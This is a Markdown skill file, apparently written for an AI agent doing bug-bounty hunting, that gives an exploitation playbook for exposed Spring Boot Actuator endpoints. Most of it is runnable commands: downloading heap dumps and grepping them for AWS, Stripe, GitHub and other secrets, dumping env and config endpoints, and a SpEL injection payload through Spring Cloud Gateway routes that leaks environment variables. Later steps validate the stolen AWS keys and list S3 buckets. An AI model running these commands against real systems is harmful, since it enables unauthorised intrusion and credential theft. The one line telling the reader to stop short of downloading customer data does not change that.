---
name: spring-boot-actuator
description: spring-boot-actuator reference material.
---

# Spring Boot Actuator — exploitation deep-dive

Part of `skills/hunt-info-disclosure/SKILL.md`. Read this ONLY when the target fingerprints as a Spring Boot service (`Server:` header shows Tomcat/Jetty/Undertow, an `X-Application-Context` header is present, or `/actuator/health` returns 200).

---

### Sub-technique C — Spring Boot Actuator exploitation

```bash
# Detect actuator presence
curl -s https://target/actuator | jq .
curl -s https://target/actuator/health
# Response with "_links" object → actuator exposed

# CRITICAL endpoints — heap dump (Volkswagen pattern)
curl -s -o heapdump.bin https://target/actuator/heapdump
strings heapdump.bin | grep -E 'AKIA[0-9A-Z]{16}' | head -20  # AWS keys
strings heapdump.bin | grep -E 'AIza[0-9A-Za-z_-]{35}' | head -20  # Google API
strings heapdump.bin | grep -E 'sk_live_[0-9a-zA-Z]{24,}' | head -20  # Stripe
strings heapdump.bin | grep -E 'jdbc:[a-z]+://[^@]+@' | head -20  # DB URIs
# Or load in Eclipse Memory Analyzer (MAT) for proper analysis

# HIGH endpoints
curl -s https://target/actuator/env | jq .
curl -s https://target/actuator/configprops | jq .
curl -s https://target/actuator/beans | jq '.contexts.application.beans | keys'
curl -s https://target/actuator/threaddump
curl -s https://target/actuator/mappings
curl -s https://target/actuator/loggers

# CVE-2025-41243 Spring Cloud Gateway property modification (CVSS 10.0)
# Trigger condition: management.endpoints.web.exposure.include=gateway
curl -s https://target/actuator/gateway/routes
# If 200 with route list — vulnerable
# Exploit: POST a new route with SpEL that reads/modifies env properties
curl -X POST https://target/actuator/gateway/routes/exploit \
  -H 'Content-Type: application/json' \
  -d '{"id":"exploit","predicates":[{"name":"Path","args":{"_genkey_0":"/exploit"}}],"filters":[{"name":"AddResponseHeader","args":{"name":"X-Out","value":"#{T(java.lang.System).getenv()}"}}],"uri":"http://localhost"}'
curl -X POST https://target/actuator/gateway/refresh
curl -i https://target/exploit  # X-Out header now leaks env

# CVE-2025-41253 Spring Cloud Gateway info disclosure (CVSS 7.5)
# SpEL injection via actuator endpoint
# (Verbatim payload restricted in vendor advisory; see https://spring.io/security/cve-2025-41253)

# CVE-2025-22235 Spring Boot EndpointRequest.to wrong matcher (CVSS 7.3)
# Probe /null/** path when actuator endpoints disabled but EndpointRequest.to() used
curl -s https://target/null/

# Reference: https://www.syscrest.com/2025/02/securing-spring-boot-actuator/ (Volkswagen analysis)
# Reference: https://www.cyberkendra.com/2024/12/vulnerability-in-spring-boot-actuator.html (Wiz Dec 2024)
```

### Sub-technique J — Memory dump analysis (Volkswagen heapdump pattern)

```bash
# Once you have a heap dump (Spring Boot /actuator/heapdump or Java jstack/jmap)
# Eclipse Memory Analyzer (MAT) — the standard tool

# Or strings extraction
strings heapdump.bin > heapdump.txt

# Pattern match for common secret formats
grep -E 'AKIA[0-9A-Z]{16}' heapdump.txt    # AWS access key
grep -E 'AIza[0-9A-Za-z_-]{35}' heapdump.txt  # Google API
grep -E 'sk_live_[0-9a-zA-Z]{24,}' heapdump.txt  # Stripe live
grep -E 'ghp_[0-9a-zA-Z]{36}' heapdump.txt    # GitHub PAT
grep -E 'jdbc:[a-z]+://' heapdump.txt          # DB URI
grep -E 'eyJhbGciO[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' heapdump.txt  # JWT
grep -E '-----BEGIN [A-Z ]+ KEY-----' heapdump.txt  # PEM keys

# Volkswagen Spring Boot Actuator pattern (Wiz Threat Research, SYSCREST analysis):
# 1. Find /actuator/heapdump exposed
# 2. Download heapdump (often 100MB-2GB)
# 3. Extract AWS keys from strings
# 4. Validate keys: aws sts get-caller-identity
# 5. List S3 buckets: aws s3 ls
# 6. STOP — that's the report. Don't pivot to actually downloading customer data.

# Reference: https://www.syscrest.com/2025/02/securing-spring-boot-actuator/
```

